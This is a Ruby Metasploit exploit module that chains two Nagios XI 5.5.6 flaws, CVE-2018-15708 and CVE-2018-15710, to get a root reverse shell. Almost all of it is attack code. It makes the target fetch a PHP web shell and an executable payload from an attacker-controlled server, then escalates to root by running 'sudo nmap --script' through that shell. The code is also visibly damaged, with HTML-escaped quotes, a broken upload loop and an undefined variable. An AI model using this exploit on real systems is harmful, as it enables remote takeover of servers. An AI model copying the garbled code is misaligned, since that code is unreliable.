# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HttpServer::HTML

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => "Nagios XI Magpie_debug.php Root Remote Code Execution",
      &#039;Description&#039;    => %q{
         This module exploits two vulnerabilities in Nagios XI 5.5.6:
         CVE-2018-15708 which allows for unauthenticated remote code execution
         and CVE 2018–15710 which allows for local privilege escalation.
         When combined, these two vulnerabilities give us a root reverse shell.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Chris Lyne (@lynerc)&#039;, # First working exploit
          &#039;Guillaume André (@yaumn_)&#039; # Metasploit module
        ],
      &#039;References&#039;     =>
        [
          [&#039;CVE&#039;, &#039;2018-15708&#039;],
          [&#039;CVE&#039;, &#039;2018-15710&#039;],
          [&#039;EDB&#039;, &#039;46221&#039;],
          [&#039;URL&#039;, &#039;https://medium.com/tenable-techblog/rooting-nagios-via-outdated-libraries-bb79427172&#039;],
          [&#039;URL&#039;, &#039;https://www.tenable.com/security/research/tra-2018-37&#039;]
        ],
      &#039;Platform&#039;       => &#039;linux&#039;,
      &#039;Arch&#039;           => [ARCH_X86, ARCH_X64],
      &#039;Targets&#039;        =>
        [
          [&#039;Nagios XI 5.5.6&#039;, version: Gem::Version.new(&#039;5.5.6&#039;)]
        ],
      &#039;DefaultOptions&#039; =>
        {
          &#039;RPORT&#039; => 443,
          &#039;SSL&#039; => true
        },
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => "2018-11-14",
      &#039;DefaultTarget&#039;  => 0
     ))

    register_options(
      [
        OptString.new(&#039;RSRVHOST&#039;, [true, &#039;A public IP at which your host can be reached (e.g. your router IP)&#039;]),
        OptString.new(&#039;RSRVPORT&#039;, [true, &#039;The port that will forward to the local HTTPS server&#039;, 8080]),
        OptInt.new(&#039;HTTPDELAY&#039;, [false, &#039;Number of seconds the web server will wait before termination&#039;, 5])
      ])

    @WRITABLE_PATHS = [
      [&#039;/usr/local/nagvis/share&#039;, &#039;/nagvis&#039;],
      [&#039;/var/www/html/nagiosql&#039;,  &#039;/nagiosql&#039;]
    ]
    @writable_path_index = 0
    @MAGPIERSS_PATH = &#039;/nagiosxi/includes/dashlets/rss_dashlet/magpierss/scripts/magpie_debug.php&#039;
    @session_opened = false
    @webshell_name = "#{Rex::Text.rand_text_alpha(10)}.php"
    @nse_name = "#{Rex::Text.rand_text_alpha(10)}.nse"
  end

  def on_request_uri(cli, req)
    if @current_payload == @webshell_name
      send_response(cli, &#039;<?php system($_GET[\&#039;cmd\&#039;])?>&#039;)
    else
      send_response(cli, generate_payload_exe)
    end
  end

  def primer
    res = send_request_cgi(
      {
        &#039;method&#039;  => &#039;GET&#039;,
        &#039;uri&#039;     => normalize_uri(@MAGPIERSS_PATH),
        &#039;vars_get&#039; => {
          &#039;url&#039; => "https://#{datastore[&#039;RSRVHOST&#039;]}:#{datastore[&#039;RSRVPORT&#039;]}#{get_resource} " +
          &#039;-o &#039; + @WRITABLE_PATHS[@writable_path_index][0] + "/#{@current_payload}"
        }
      }, 5)

    if !res || res.code != 200
      print_error(&#039;Couldn\&#039;t send malicious request to target.&#039;)
    end
 end

  def check_upload
    res = send_request_cgi(
      {
        &#039;method&#039; => &#039;GET&#039;,
        &#039;uri&#039;    => normalize_uri("#{@WRITABLE_PATHS[@writable_path_index][1]}/#{@current_payload}")
      }, 5)
    if res && res.code == 200
      print_status("#{@current_payload} uploaded with success!")
      return true
    else
      print_error("Couldn&#039;t upload #{@current_payload}.")
      return false
    end
  end

  def check
    res = send_request_cgi(
      {
        &#039;method&#039;  => &#039;GET&#039;,
        &#039;uri&#039;     => normalize_uri(@MAGPIERSS_PATH)
      }, 5)

    if res && res.code == 200
      return Exploit::CheckCode::Appears
    else
      return Exploit::CheckCode::Safe
    end
  end

  def exploit
    all_files_uploaded = false

    # Upload useful files on the target
    for i in 0..@WRITABLE_PATHS.size
      @writable_path_index = i
        @current_payload = filename
        begin
          Timeout.timeout(datastore[&#039;HTTPDELAY&#039;]) { super }
        rescue Timeout::Error
          if !check_upload
            break
            all_files_uploaded = true
          end
        end
      end
      if all_files_uploaded
        break
      end
    end


    register_file_for_cleanup(
      "#{@WRITABLE_PATHS[@writable_path_index][0]}/#{@webshell_name}",
      "/var/tmp/#{@nse_name}"
    )

    # Commands to escalate privileges, some will work and others won&#039;t
    # depending on the Nagios version
    cmds = [
      "&& sudo nmap --script /var/tmp/#{@nse_name}"
   ]

    # Try to launch root shell
    for cmd in cmds
      res = send_request_cgi(
        {
          &#039;uri&#039;     => normalize_uri("#{@WRITABLE_PATHS[@writable_path_index][1]}/#{@webshell_name}"),
          &#039;method&#039;  => &#039;GET&#039;,
          &#039;vars_get&#039; => {
            &#039;cmd&#039; => cmd
          }
        }, 5)

      if !res && session_created?
        break
      end
      print_status(&#039;Couldn\&#039;t get remote root shell, trying another method&#039;)
    end
  end
end

